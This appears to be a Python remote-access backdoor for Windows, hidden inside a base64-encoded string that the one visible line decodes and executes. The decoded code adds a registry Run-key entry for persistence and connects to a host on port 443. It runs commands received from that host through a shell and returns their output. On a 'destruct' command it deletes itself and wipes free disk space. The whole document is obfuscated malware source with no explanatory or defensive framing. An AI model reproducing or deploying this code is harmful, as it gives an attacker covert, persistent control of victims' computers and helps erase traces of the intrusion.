import base64,sys;exec(base64.b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldA0KaW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBvcw0KaW1wb3J0IGJhc2U2NA0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmltcG9ydCBfd2lucmVnDQpmcm9tIF93aW5yZWcgaW1wb3J0IEhLRVlfQ1VSUkVOVF9VU0VSIGFzIEhLQ1UNCg0KDQpkZWYgYmFzaWNfcGVyc2lzdGVuY2UoKToNCiAgICBydW5fa2V5ID0gcidTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nDQogICAgYmluX3BhdGggPSBzeXMuZXhlY3V0YWJsZQ0KDQogICAgdHJ5Og0KICAgICAgICByZWdfa2V5ID0gX3dpbnJlZy5PcGVuS2V5KEhLQ1UsIHJ1bl9rZXksIDAsIF93aW5yZWcuS0VZX1dSSVRFKQ0KICAgICAgICBfd2lucmVnLlNldFZhbHVlRXgocmVnX2tleSwgJ2JyJywgMCwgX3dpbnJlZy5SRUdfU1osIGJpbl9wYXRoKQ0KICAgICAgICBfd2lucmVnLkNsb3NlS2V5KHJlZ19rZXkpDQogICAgICAgIHJldHVybiBUcnVlLCAnSEtDVSBSdW4gcmVnaXN0cnkga2V5IGFwcGxpZWQnDQogICAgZXhjZXB0IFdpbmRvd3NFcnJvcjoNCiAgICAgICAgcmV0dXJuIEZhbHNlLCAnSEtDVSBSdW4gcmVnaXN0cnkga2V5IGZhaWxlZCcNCg0KDQpkZWYgZGVzdHJ1Y3QoKToNCiAgICBjbGllbnQuY2xvc2UoKQ0KICAgIG9zLnJlbW92ZShzZWxmX3BhdGgpDQogICAgZm9sZGVyX3BhdGggPSBvcy5wYXRoLmRpcm5hbWUoc2VsZl9wYXRoKQ0KICAgIG9zLnN5c3RlbSgiY2lwaGVyIC9XOiVzIiAlIGZvbGRlcl9wYXRoKQ0KDQoNCmRlZiBsZXRzX3RhbGsoKToNCiAgICBkYXRhID0gTm9uZQ0KICAgIHdoaWxlIGRhdGEgaXMgTm9uZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY2xpZW50LmNvbm5lY3QoKGhvc3QsIHBvcnQpKQ0KICAgICAgICAgICAgY2xpZW50LnNlbmQocF9tZXNzYWdlKQ0KDQogICAgICAgICAgICBpZiBkYXRhID09IGJhc2U2NC5iNjRlbmNvZGUoJ2Rlc3RydWN0Jyk6DQogICAgICAgICAgICAgICAgZGVzdHJ1Y3QoKQ0KICAgICAgICAgICAgICAgIHN5cy5leGl0KCkNCg0KICAgICAgICAgICAgZGF0YSA9IGNsaWVudC5yZWN2KEJVRkZFUl9TSVpFKQ0KICAgICAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MuUG9wZW4oDQogICAgICAgICAgICAgICAgYmFzZTY0LmI2NGRlY29kZShkYXRhKSwNCiAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUNCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIHN0ZG91dF92YWx1ZSA9IHByb2Nlc3Muc3Rkb3V0LnJlYWQoKSArIHByb2Nlc3Muc3RkZXJyLnJlYWQoKQ0KICAgICAgICAgICAgY2xpZW50LnNlbmQoYmFzZTY0LmI2NGVuY29kZShzdGRvdXRfdmFsdWUpKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCg1KQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBicmVhaw0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgcF9zdGF0dXMsIHBfbWVzc2FnZSA9IGJhc2ljX3BlcnNpc3RlbmNlKCkNCiAgICBzZWxmX3BhdGggPSBvcy5wYXRoLmFic3BhdGgoX19maWxlX18pDQogICAgaG9zdCA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQogICAgcG9ydCA9IDQ0Mw0KICAgIEJVRkZFUl9TSVpFID0gNDA5Ng0KICAgIGNsaWVudCA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCg0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIGxldHNfdGFsaygpDQogICAgICAgIHRpbWUuc2xlZXAoMzApDQoNCg0KDQo=')))